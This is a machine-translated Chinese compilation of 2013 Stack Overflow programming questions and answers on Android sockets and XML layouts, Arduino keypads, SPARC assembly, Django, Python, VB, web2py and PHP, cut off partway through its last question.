If you are not sure about the name of your chrome browser this should help in the terminal:

```
ls /usr/bin/ | grep -i chrom 
```

# android - Android：如何确定文件的文件扩展名

> ID：14916632
> 
> 赞同：0
> 
> 时间：2013-02-17T00:12:27.117
> 
> 标签：android, file, sockets, p2p, file-sharing

我正在尝试使用 Socket 编程在两部 Android 手机之间共享文件。问题是现在我必须在接收端硬编码文件扩展名。有没有办法可以自动确定正在接收的文件的扩展名？这是我的代码。

客户端

```
 socket = new Socket(IP,4445);
        File myFile = new File ("/mnt/sdcard/Pictures/A.jpg");
        FileInputStream fis = null;
            fis = new FileInputStream(myFile);
        OutputStream os = null;
            os = socket.getOutputStream();
        int filesize = (int) myFile.length();

        byte [] buffer  = new byte [filesize];
             int bytesRead =0;
                while ((bytesRead = fis.read(buffer)) > 0) {
                 os.write(buffer, 0, bytesRead);
                 System.out.println("SO sendFile" + bytesRead);
                 }
                os.flush();
                os.close();
                fis.close();
                socket.close();
        } 
```

和服务器端

```
 FileOutputStream fos = null;
    File root = Environment.getExternalStorageDirectory();
            fos = new FileOutputStream(new File(root,"B.jpg")); //Here I have to hardcode B.jpg with jpg extension.
        BufferedOutputStream bos = new BufferedOutputStream(fos);
            ServerS = new ServerSocket(4445);
            clientSocket = ServerS.accept();
        InputStream is = null;
            is = clientSocket.getInputStream();

        int bytesRead = 0;
        int current = 0;
        byte [] mybytearray  = new byte [329];
            do {

                bos.write(mybytearray,0,bytesRead);
                bytesRead = is.read(mybytearray, 0, mybytearray.length);

                } while(bytesRead > -1);

                bos.flush();
                bos.close();
            clientSocket.close();
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T01:29:41.197

通过执行以下操作，您可以很容易地找到文件扩展名：

```
String extension = filename.substring(filename.lastIndexOf('.')); 
```

# android - Arduino Serial.println 在 android 文本框中发送

> ID：14916633
> 
> 赞同：1
> 
> 时间：2013-02-17T00:12:28.273
> 
> 标签：android, bluetooth, serial-port, arduino

再会！我真的不知道如何提出正确的问题，但我会尝试彻底解释这种情况。

我试图为安卓手机制作一个 12 键键盘，我使用了迷你克隆版的 arduino Atmeg168、一个 3x4 键盘和一个蓝牙屏蔽，老实说，我还没有真正成功地显示所有的字母。我正在使用一个名为蓝牙 SPP 的 Android 应用程序来接收蓝牙传输的串行数据，我想要实现的是能够将字符或发送到 android 文本框的字符发送到文本框。可能吗？这是我一直在使用的代码

```
#include <Keypad.h>
#include <SoftwareSerial.h>
#include <ctype.h>

SoftwareSerial mySerial(2, 3);
const byte ROWS = 4; 
const byte COLS = 3; 
int digitsEntered = 0; //number of digits entered

char alphaKeys[ROWS][COLS] = {
    { '.','a','d' },
    { 'g','j','m' },
    { 'p','t','w' },
    { '*',' ','#' }
};

char alpha2Keys[ROWS][COLS] = {
    { ',','b','e' },
    { 'h','k','n' },
    { 'q','u','x' },
    { '*','s','#' }
};

char alpha3Keys[ROWS][COLS] = {
    { '?','c','f' },
    { 'i','l','o' },
    { 'r','v','y' },
    { '*','z','#' }
};

char numberKeys[ROWS][COLS] = {
    { '1','2','3' },
    { '4','5','6' },
    { '7','8','9' },
    { '*','0','#' }
};

boolean alpha = false; 
boolean alpha2 = false;
boolean alpha3 = false;

byte rowPins[ROWS] = { 5, 10, 9, 7 };
byte colPins[COLS] = {6, 4, 8 };

Keypad numpad( makeKeymap(numberKeys), rowPins, colPins, sizeof(rowPins), sizeof(colPins) );
Keypad ltrpad( makeKeymap(alphaKeys), rowPins, colPins, sizeof(rowPins), sizeof(colPins) );
Keypad ltr( makeKeymap(alpha2Keys), rowPins, colPins, sizeof(rowPins), sizeof(colPins) );
Keypad letters( makeKeymap(alpha3Keys), rowPins, colPins, sizeof(rowPins), sizeof(colPins) );

unsigned long startTime;
const byte ledPin = 13;        
const byte led = 12;
void setup() {

pinMode (4, INPUT);//Column 1
pinMode (6, INPUT);//Column 2
pinMode (8, INPUT);//Column 3
digitalWrite(4, HIGH);//Pull up resistor of Arduino
digitalWrite(6, HIGH);// Pull up resistor of Arduino
digitalWrite(8, HIGH);// Pull up resistor of Arduino

   Serial.begin(9600);
   Serial.println("Testing...."); 
   mySerial.begin(9600);
   mySerial.println("Successful!");
    pinMode(ledPin, OUTPUT);
    pinMode(led, OUTPUT);
    digitalWrite(ledPin, LOW);
    ltr.begin( makeKeymap(alpha2Keys) );
    letters.begin( makeKeymap(alpha3Keys) );
    ltrpad.begin( makeKeymap(alphaKeys) );
    numpad.begin( makeKeymap(numberKeys) );
    letters.addEventListener(keypadEvent_ltr3);
    ltr.addEventListener(keypadEvent_ltr2); 
    ltrpad.addEventListener(keypadEvent_ltr);  
    letters.setHoldTime(300);  
    ltr.setHoldTime(300);   
    ltrpad.setHoldTime(300);                   
    numpad.addEventListener(keypadEvent_num);  
    numpad.setHoldTime(300);                   
}

char key;

void loop() {

    if( alpha )
        key = ltrpad.getKey( );
    else if( alpha2 )
        key = ltr.getKey( );
    else if( alpha3 )
        key = letters.getKey( );
    else
        key = numpad.getKey( );

    if (alpha && millis()-startTime>100) {  
      digitalWrite(ledPin,!digitalRead(ledPin));
        startTime = millis();
    }
    else if (alpha2 && millis()-startTime>100) {  
      digitalWrite(ledPin,!digitalRead(ledPin));
        startTime = millis();
    }
    else if (alpha3 && millis()-startTime>100) {  
      digitalWrite(ledPin,!digitalRead(ledPin));
        startTime = millis();
    }
    if (key != NO_KEY)
{
digitsEntered++;
mySerial.begin(9600);
mySerial.print(key);
delay(100);
}
}

static char virtKey = NO_KEY;   
static char physKey = NO_KEY;
static char buildStr[12];
static byte buildCount;
static byte pressCount;

static byte kpadState;

void keypadEvent_ltr(KeypadEvent key) {
    kpadState = ltrpad.getState( );
    swOnState( key );
}
void keypadEvent_ltr2(KeypadEvent key) {
    kpadState = ltr.getState( );
    swOnState( key );
} 
void keypadEvent_num( KeypadEvent key ) {
    kpadState = numpad.getState( );
    swOnState( key );
}

void keypadEvent_ltr3(KeypadEvent key) {
    kpadState = letters.getState( );
    swOnState( key );
} 

void swOnState( char key ) {
    switch( kpadState ) {
        case PRESSED:
            if (isalpha(key)) {             
                if (physKey != key) {        
                    pressCount = 0;
                    virtKey = key;
                    physKey = key;
                }
                else {                       
                    virtKey++;                   
                    pressCount++;                
                }
                    if (pressCount > 2) {    
                        pressCount = 0;
                        virtKey = key;
                    }
                    Serial.print(virtKey);   
                }

                if (isdigit(key) || key == ' ' || key == '.')
                    Serial.print(key);
                if (key == '#')
                    Serial.println();

        case HOLD:
            if (key == '#')  {               
                if (alpha == true)  {        
                    alpha = false;           
                    digitalWrite(ledPin, LOW);
                    digitalWrite(led, LOW);
                }
                else  {                      
                    alpha = true;            
                }

            }
            else if (key == '*')  {               
                if (alpha2 == true)  {        
                    alpha2 = false;           
                    digitalWrite(ledPin, HIGH);           
                    digitalWrite(led, HIGH);

                }
                else  {                      
                    alpha2 = true;            
                }

            }
            else if (key == '*')  {               
                if (alpha3 == true)  {        
                    alpha3 = false;           
                    digitalWrite(ledPin, HIGH);           
                    digitalWrite(led, HIGH);

                }
                else  {                      
                    alpha3 = true;            
                }

            }   

            else  {                          
                buildStr[buildCount++] = (isalpha(key)) ? virtKey : key;
                buildStr[buildCount] = '\0';
                Serial.println();
                Serial.println(buildStr);
            }
            break;

        case RELEASED:
            if (buildCount >= sizeof(buildStr))  buildCount = 0;  
            break;

    }  
} 
```

还有一种方法可以通过电话将arduino识别为键盘吗？

# python - 使用比例将图像裁剪到最大的中心部分

> ID：14916635
> 
> 赞同：0
> 
> 时间：2013-02-17T00:12:33.750
> 
> 标签：python, ruby, linux, shell, imagemagick

我想将图像裁剪到收音机，例如 4:3。

但我想要最大的居中部分，例如：

![从 1](../Images/3e1b618596ade4eb42d17c2cb3b74fdf.png)到![至 1](../Images/ddc4a07547b5d3e53793e87a25f95e6b.png)

![从 2](../Images/ac26cdd43b86fcecae7ee928f8297f35.png)到![至 2](../Images/ff63fbf65f95ed762ca455f482575ee5.png)

我没有在[imagemagick 文档](http://www.imagemagick.org/Usage/crop)中找到我的情况。

（Imgur 尺寸非常不准确，但你应该明白）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:49:17.200

最后我为我写了一个小脚本：[reduce-ration](https://gist.github.com/Dorian/4969638)（它需要 ruby​​ 和 fastimage gem `gem install fastimage`：）

在我的例子中：`reduce-maxi 4x3 center shutup.png templerun.jpg`

你可以像这样使用它：`reduce-maxi RATIO DIRECTION IMAGES...`. 有关更多详细信息，请参阅[要点](https://gist.github.com/Dorian/4969638)。

我还编写了一个脚本来获取图像的比例。见[要点](https://gist.github.com/Dorian/4969638)。

# android - 为标签 LinearLayout 找到了意外的命名空间前缀“xmlns”

> ID：14916638
> 
> 赞同：51
> 
> 时间：2013-02-17T00:12:41.903
> 
> 标签：android, xml, eclipse, android-xml

我在关注 xml 文件时出错。*“为标签 LinearLayout 找到了意外的命名空间前缀“xmlns””*。我也尝试了其他类似问题中提供的解决方案，但它对我不起作用。在使用的 3 行中发生了相同的错误`LinearLayout`。

```
<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:background="@drawable/background" >

    <LinearLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:orientation="vertical" >

        <TextView
            android:id="@+id/menu_top_text"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="@string/name_version"
            android:textColor="@color/black"
            android:textSize="20sp" />

        <LinearLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:orientation="horizontal" >
        </LinearLayout>

        <!-- A horizontal line -->

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="30px" >
        </FrameLayout>

        <LinearLayout
            xmlns:android="http://schemas.android.com/apk/res/android"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:gravity="center_horizontal"
            android:orientation="vertical" >

            <LinearLayout
                xmlns:android="http://schemas.android.com/apk/res/android"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:gravity="center"
                android:orientation="horizontal" >

                <Button
                    android:id="@+id/start_stop_button"
                    android:layout_width="74dp"
                    android:layout_height="74dp"
                    android:text="@string/start_server" />

                <Button
                    android:id="@+id/instructions"
                    android:layout_width="120dp"
                    android:layout_height="74dp"
                    android:text="@string/instructions_label" />

                <Button
                    android:id="@+id/setup"
                    android:layout_width="74dp"
                    android:layout_height="74dp"
                    android:text="@string/setup_label" />
            </LinearLayout>
        </LinearLayout>

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="30px" >
        </FrameLayout>

        <!-- A horizontal line -->

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="1px"
            android:background="#666666" >
        </FrameLayout>

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="10px" >
        </FrameLayout>

        <TableLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:shrinkColumns="2" >

            <TableRow>

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="left"
                    android:text="@string/server_status"
                    android:textColor="@color/black"
                    android:textSize="16sp" />
                <!-- A small spacer between the columns -->

                <FrameLayout
                    android:layout_width="3sp"
                    android:layout_height="wrap_content" />

                <TextView
                    android:id="@+id/server_status"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="@string/unknown"
                    android:textColor="@color/black"
                    android:textSize="16sp" />
            </TableRow>
        </TableLayout>

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="10px" >
        </FrameLayout>

        <!-- A horizontal line -->

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="1px"
            android:background="#666666" >
        </FrameLayout>

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="10px" >
        </FrameLayout>

        <TableLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:shrinkColumns="2" >

            <TableRow>

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="left"
                    android:text="@string/my_url_is"
                    android:textColor="@color/black"
                    android:textSize="16sp" />
                <!-- A small spacer between the columns -->

                <FrameLayout
                    android:layout_width="3sp"
                    android:layout_height="wrap_content" />

                <TextView
                    android:id="@+id/ip_address"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="@string/no_url_yet"
                    android:textColor="@color/black"
                    android:textSize="16sp" />
            </TableRow>

            <TableRow>

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="left"
                    android:text="@string/wifi_status"
                    android:textColor="@color/black"
                    android:textSize="16sp" />
                <!-- A small spacer between the columns -->

                <FrameLayout
                    android:layout_width="3sp"
                    android:layout_height="wrap_content" />

                <TextView
                    android:id="@+id/wifi_status"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="@string/unknown"
                    android:textColor="@color/black"
                    android:textSize="16sp" />
            </TableRow>

            <TableRow>

                <TextView
                    android:id="@+id/last_error_label"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="left"
                    android:text="@string/last_error"
                    android:textSize="16sp"
                    android:visibility="gone" />
                <!-- A small spacer between the columns -->

                <FrameLayout
                    android:layout_width="3sp"
                    android:layout_height="wrap_content" />

                <TextView
                    android:id="@+id/last_error"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="@string/unknown"
                    android:textColor="#ff0000"
                    android:textSize="16sp"
                    android:visibility="gone" />
            </TableRow>
        </TableLayout>

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="10px" >
        </FrameLayout>

        <!-- A horizontal line -->

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="1px"
            android:background="#666666" >
        </FrameLayout>

        <!--
          <TextView android:id="@+id/proxy_header"
        android:layout_height="wrap_content"
        android:layout_width="wrap_content"
        android:text="@string/proxy_experimental"
        android:textSize="16sp"
        />
        -->

        <TableLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:shrinkColumns="2" >

            <TableRow>

                <!--
                 <TextView
                android:layout_height="wrap_content"
                android:layout_width="wrap_content"
                android:text="@string/proxy_status"
                android:textSize="16sp"
                android:gravity="left"
                />
                -->
                <!-- A small spacer between the columns -->

                <FrameLayout
                    android:layout_width="3sp"
                    android:layout_height="wrap_content" />
            </TableRow>

            <TableRow>

                <!-- A small spacer between the columns -->

                <FrameLayout
                    android:layout_width="3sp"
                    android:layout_height="wrap_content" />
            </TableRow>

            <TableRow>

                <!-- A small spacer between the columns -->

                <FrameLayout
                    android:layout_width="3sp"
                    android:layout_height="wrap_content" />
            </TableRow>

            <TableRow>

                <!-- A small spacer between the columns -->

                <FrameLayout
                    android:layout_width="3sp"
                    android:layout_height="wrap_content" />
            </TableRow>
        </TableLayout>

        <!-- A horizontal line -->

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="1dp"
            android:background="#666666" >
        </FrameLayout>

        <!-- A horizontal line -->

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="1dp"
            android:background="#666666" >
        </FrameLayout>

        <LinearLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:orientation="horizontal"
            android:visibility="gone" >

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="@string/server_log"
                android:textColor="#ffffff" />

            <CheckBox
                android:id="@+id/server_log_checkbox"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:checked="false" />
        </LinearLayout>

        <TextView
            android:id="@+id/server_log"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:background="#333333" />

        <!-- A horizontal line -->

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="1dp"
            android:background="#666666"
            android:visibility="gone" >
        </FrameLayout>

        <LinearLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:orientation="horizontal"
            android:visibility="gone" >

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="@string/session_monitor"
                android:textColor="#ffffff"
                android:visibility="gone" />

            <CheckBox
                android:id="@+id/session_monitor_checkbox"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:checked="false"
                android:visibility="gone" />
        </LinearLayout>

        <TextView
            android:id="@+id/session_monitor"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:background="#333333"
            android:visibility="gone" />

        <!-- A horizontal line -->

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="1dp"
            android:background="#666666" >
        </FrameLayout>

        <!-- It's visually pleasing to have some empty space at the bottom -->

        <FrameLayout
            android:layout_width="fill_parent"
            android:layout_height="15dp" />
    </LinearLayout>

</ScrollView> 
```

* * *

## 回答 #1

> 赞同：83
> 
> 时间：2013-02-17T00:22:59.930

请尝试以下操作：

从`xmlns:android="http://schemas.android.com/apk/res/android`除`ScrollView`. 我相信在 xml 文件的最外层布局或视图中**通知应用程序一次**就足够了。

* * *

## 回答 #2

> 赞同：43
> 
> 时间：2013-03-24T19:56:16.200

我用各种代码多次遇到这个问题。

这些代码过去运行得非常好，但现在它们显示这些错误......

我找到了一个非常简单的解决方案，不需要任何代码更改（添加、编辑或删除）。

转到选项卡上的项目选项卡单击选项卡从列表中选择“清洁...”

您将看到在您的工作空间中打开的所有项目的列表。

您可以选择一个项目或全部（我通常会“清理所有项目”）。单击确定。对于大约 10 个项目，该过程大约需要 5-7 秒。所有 XMLNS 错误都已解决...您应该在尝试任何其他解决方案之前尝试此操作......这就像重新启动系统以解决 70% 的问题的 Window 错误...

上述解决方案更像是一种适用于所有情况的临时解决方案。为避免将来出现这种情况，我将所有 xmlns 代码放在顶部。（可能有重复的语句，可能需要删除）

在 XML 文件上集成 Admob 时遇到了这个问题。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-06-02T01:46:52.157

在 Android xml 文件中，Android 命名空间可以：

*   只声明一次
*   仅`View`在 xml 层次结构的顶部（“外部”）Android 中声明

否则在构建项目时会收到​​错误消息。在您的情况下，顶部的 Android 视图是`ScrollView`，所以请保留

```
xmlns:android="http://schemas.android.com/apk/res/android" 
```

在 中`ScrollView`，并将其从所有其他嵌套中删除`Views`，包括`LinearLayout`.

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-04-09T09:11:09.240

对于突然看到此消息出现的人，来自的评论 `Sudhir`应该是公认的答案..我认为英语不是*那么*好：所以如果你挣扎：在 Eclipse 中，`project`点击菜单`clean...`并选择`clean all projects`这个将删除这个随机出现作为以前丢失的情况下的消息

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-03-20T02:05:28.393

我认为删除不需要的行是一种更合适的方式，因为：

1）清理项目只会解决一次问题。如果你再次启动项目或从另一个文件切换到这个 xml 文件，它会再次显示错误。

2）更重要的是，“ `xmlns:XXX`”应该是第一个节点的属性。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-03-05T14:15:50.103

```
xmlns:android="http://schemas.android.com/apk/res/android 
```

去掉上面的标签

并保持

```
<fragment
..........
........
........
......../> 
```

或者`</fragment>`

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-06-19T12:33:28.540

为了让这个问题永远消失，而不会对源进行大规模更改（这会给版本跟踪带来噪音）：

转到“问题”选项卡——右键单击消息——选择“快速修复”。将出现一个窗口，您可以在其中告诉 Eclipse 忽略项目中的此问题（或仅在一个文件中，如果您愿意）。

之后，XML 将编译正常。

# assembly - 如何将此 C for 循环转换为汇编级语言？

> ID：14916640
> 
> 赞同：0
> 
> 时间：2013-02-17T00:12:52.577
> 
> 标签：assembly, sparc

我需要编写一个汇编程序，在 -2<=x<=8 范围内找到 x^3 -14x^2 +56x -64 的最大值，最大值应该在程序末尾的一个寄存器中.

我用 C 编写了代码，但我不确定如何自己将其转换为汇编。在这一点上我真的很困惑。顺便说一句，我必须自己转换它。我不能使用 gcc 转换为程序集。这是给 SPARC 的

```
#include<stdio.h>
int  main()
{

int i;
int ans;

for (i = -2; i < 9; i++){
    ans = (i * i * i) - (14 * i * i) + (56 * i) - 64;
}
} 
```

我试图编写程序集。有人可以批评它并告诉我我的方向是否正确。另外，我将如何测试最大数量？

```
main:

  save  %sp, -96, %sp

  ba     test
  mov    -2, %a_r

loop: 

  mov    %a_r, %o0       !a_r moved into o0
  mov    %a_r, %o1       !a_r moved into o1
  call   .mul            !they are multiplied and stored in o0
  call   .mul            !they are multiplied again and stored in o0
  mov    %o0, r0         !results stored in r0
  mov    %a_r, %o0       !a_r moved into o0 and o1
  mov    %a_r, %o1
  call   .mul            !they are multiplied and stored in o0
  mov    14, %o1         
  call   .mul            !o0 result is multiplied by 14 and stored in r1
  mov    %o0, r1
  mov    56, %o0         !56 moved into o0
  mov    %a_r, %01       !a_r moved into o1
  call   .mul            !they are multiplied and stored in r2
  mov    %o0, r2         
  Sub    r0,r1,r0        !r0-r1 stored in r0
  Add    r0,r2,r0        !r0+r2 stored in r0
  Sub    r0,64,r0        !r0-64 stored in r0
  add    %a_r, 1, %a_r   !a_r + 1

test:
  cmp     %a_r %b_r      ! a_r<=8?
  ble     loop 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:42:55.940

您的回答缺少一点细节，因为我们没有关于您所针对的机器的信息。这听起来也像是功课，所以我不会给你一个完整的答案。

不过，我要告诉您的是，要在汇编（任何类型）中实现循环，您需要使用标签和分支指令。

除此之外，它是一个简单的求和和乘法。只需注意将`i`和存储`ans`在两个不同的寄存器中（毕竟它们是不同的变量）。

编辑

看来您的方向是正确的（我从未为 SPARC 写过文章，但快速浏览一下文档会告诉我您的想法是正确的）。关于最大数量：您将如何在 C/C++ 中进行处理？想想看，做同样的组装！:)

# javascript - 谷歌地图 V3 信息框 - 扩大地图边界？

> ID：14916641
> 
> 赞同：0
> 
> 时间：2013-02-17T00:13:01.033
> 
> 标签：javascript, google-maps, google-maps-api-3, bing-maps

我正在开发一个在地图上显示一些照片的[wordpress 插件。](http://wordpress.org/extend/plugins/nextgen-gallery-geo/ "WordPress 插件")详细信息显示在信息框/信息窗口中。

这适用于 bing 地图 6.3，信息框超出了地图的边界。

示例：[http ://www.denktfrei.de/?p=805](http://www.denktfrei.de/?p=805)

现在我不想添加对 Google 地图 3 和 Bing 地图 7 的支持。这两个 API 都不支持此类信息框，信息框/信息窗口不能大于地图。无论如何，我怎样才能创建这样的信息框？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-21T22:40:28.497

如评论中所述，我建议使用从地图控件本身添加到 DOM 的自定义信息框。这样您就不会被限制在地图控件的 DIV 容器中。

有关示例，请参见下面的代码：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title></title>
    <script type="text/javascript" charset="UTF-8" src="http://ecn.dev.virtualearth.net/mapcontrol/mapcontrol.ashx?v=7.0">
    </script>
    <script type="text/javascript">
        var map = null;

        function getMap() {

            map = new Microsoft.Maps.Map(
                document.getElementById('myMap'), 
                { 
                    credentials: 'YOURKEY', 
                    showCopyright: false
                });

            // Create the pushpin
            var pushpin = new Microsoft.Maps.Pushpin(new Microsoft.Maps.Location(47.5, 2.75));

            // Add the pushpin to the map
            map.entities.push(pushpin);

            // Bind the click event on the pushpin
            Microsoft.Maps.Events.addHandler(pushpin, 'click', function(e) {
                if (e.targetType == 'pushpin') {
                    var box = document.getElementById('infobox');
                    box.style.top = e.pageY + 'px';
                    box.style.left = e.pageX + 'px';
                    box.style.visibility = 'visible';
                }
            });
        }

    </script>
</head>
<body onload="getMap();">
    <div id="container" style="position:relative;"></div>
    <div id="myMap" style="position: absolute;z-index:1; width: 800px; height: 600px;">
    </div>
    <div id="infobox" style="float:left;z-index:2; visibility:hidden;position:absolute; width:500px; height: 300px; background-color:White; border: 1px solid #333;">Sample content for an infobox which should be larger than the map control.</div>
</body>
</html> 
```

# django - 多对多以及如何从查询集中获取查询集

> ID：14916642
> 
> 赞同：14
> 
> 时间：2013-02-17T00:13:17.517
> 
> 标签：django, django-queryset

我有以下型号：

```
class Product(models.Model):
    name = CharField(max_length=30)

class Store(models.Model):
    name = CharField(max_length=30)
    product = models.ManyToManyField(Product) 
```

如何获得`Store`带有产品名称的 s`product_name`以及获得所有产品（带有名称的产品除外`product_name`）？是否可以在一个查询中完成？在原始 SQL 中，它将是 simple `JOIN`s。不知道如何通过 Django 实现它。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-02-17T01:59:15.493

由于它是惰性查询集评估，您实际上可以用 Django 做这些事情。Django 的`in`字段查找接受列表和查询集。下面将创建一个嵌套的 SQL 代码：

```
products = Product.objects.filter(store_set__in=stores_qs)
stores_qs = Store.objects.filter(product__name='product_name') 
```

[这](https://docs.djangoproject.com/en/dev/ref/models/querysets/#in)是 Django`in`文档。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-02-17T01:33:28.450

您应该能够根据 Product 的属性过滤商店，然后对检索到的对象进行 prefetch_related 。

```
Store.objects.filter(product__name="product_name").prefetch_related('product') 
```

这应该以最少的时间访问数据库以实现您正在寻找的东西 - 两次。

进一步的文档可以在[这里](https://docs.djangoproject.com/en/dev/ref/models/querysets/#prefetch-related)找到。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-17T02:04:02.927

获取名为“product_name”的产品的商店：

```
Store.objects.filter(product__name='product_name') 
```

获取名称为“product_name”的产品以外的所有产品：

```
Product.objects.exclude(name='product_name') 
```

# python - 如何创建带有空格、引号、点、双引号等的字典

> ID：14916644
> 
> 赞同：0
> 
> 时间：2013-02-17T00:13:43.883
> 
> 标签：python, dictionary, converter

我在这里看到了这个问题 aDict 包括字母，但我怎么能包括空格、引号、点、双引号呢？

[如何以简洁的方式创建以字母为键的字典？](https://stackoverflow.com/questions/14902904/how-to-create-a-dict-with-letters-as-keys-in-a-concise-way)

怎么能在这里包含空格、引号、点、双引号？谢谢

```
import string
aDict = dict(zip(string.ascii_lowercase, range(1, 27))) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:19:48.753

通过这种方式，您可以创建一个 dict，其中 ascii 字符作为键，相应的数字作为值：

```
aDict = { chr(x):x for x in range(129) } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T00:20:58.637

您可以通过从空格字符开始到（但不包括）该字符来获取所有可见`\x7f`字符。

```
{v: k for k, v in enumerate((chr(x) for x in range(ord(' '), ord('\x7f'))), 1)} 
```

如果你想包含`\t`, `\n`,`\r`你可以把它们链接起来。

```
import itertools

{v: k for k, v in
 enumerate(itertools.chain(('\t', '\n', '\r'),
                           (chr(x) for x in range(ord(' '), ord('\x7f')))),
           1)} 
```

# asp.net - 标签不显示在VB中的文本

> ID：14916649
> 
> 赞同：0
> 
> 时间：2013-02-17T00:14:20.033
> 
> 标签：asp.net, vb.net, visual-studio

我的代码没有在 AnswerText.Text 中显示文本是否有原因？

```
 Dim EquationValues() As String

    ' Split the array into a string array based on blank spaces
    EquationValues = DisplayTextBox.Text.Split(" "c)

    ' Declaring an integer as a counter for the loop
    Dim LoopCounter As Integer = 0

        ' Setting a for loop on the array and performing the operations
    For LoopCounter = 0 To EquationValues.Length - 1
        If EquationValues(LoopCounter) = "/" Then
            AnswerTextBox.Text = EquationValues(LoopCounter - 1) / EquationValues(LoopCounter + 1)
        End If

        If EquationValues(LoopCounter) = "*" Then
            AnswerTextBox.Text = EquationValues(LoopCounter - 1) * EquationValues(LoopCounter + 1)
        End If
    Next 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T02:05:15.053

EquationValues 是一个数组，检查长度不是我认为您正在寻找的。您正在寻找计数...数组中的索引数...尝试

```
For LoopCounter = 0 To EquationValues.Count - 1 
```

我回答了您之前关于字符串解析数学方程的问题（[使用 vb 将字符串解析为方程](https://stackoverflow.com/questions/14916062/parsing-string-to-equation-with-vb)）。该示例处理了 * 和 /，也许这可能对您有用。

祝你好运 ：）

# web2py - 在 Web2py 中，整数字段上的 orderby 被视为字符串

> ID：14916650
> 
> 赞同：1
> 
> 时间：2013-02-17T00:14:31.527
> 
> 标签：web2py

我有一个疑问：-

```
result = db(db.tag_count.user_id == user_id).select(db.tag_count.name, db.tag_count.count, orderby=~ db.tag_count.count, limitby=(0, 10)) 
```

表定义为

```
db.define_table('tag_count',
                Field('name'),
                Field('user_id', db.auth_user),
                Field('count', 'integer'),
                format='%(title)s') 
```

查询的目的是返回包含 tag_count 最高整数值的前 10 行。

事实上，它返回 tag_count 的最高字符串值，例如 21 , 2, 12, 2 ，即 2>12 。我预计 21、12、2、1

我使用 web2py 2.3.2 和 sqlite 作为数据库。

知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T14:43:50.007

为了以后像我这样的人。感谢安东尼在上面的评论。

原表没有将字段定义为整数，默认为字符串。我意识到我需要一个整数并更新了该字段。SQlite 无法迁移类型，因此它仍然是一个字符串。

解决方案是导出表，用整数重新创建表，并确保重新插入类型为整数。

请参阅[此处](http://web2py.com/books/default/chapter/29/06#Fixing-broken-migrations)了解更多详细信息

# php - PHP AJAX 12017 调用标头时出错（位置：）

> ID：14916657
> 
> 赞同：21
> 
> 时间：2013-02-17T00:15:43.323
> 
> 标签：php, jquery, ajax, header, location

我有一个通过 AJAX 调用 PHP 文件的 jquery 函数。在我有的那个 PHP 文件里面

```
 header('Location: http://www.google.com'); 
```

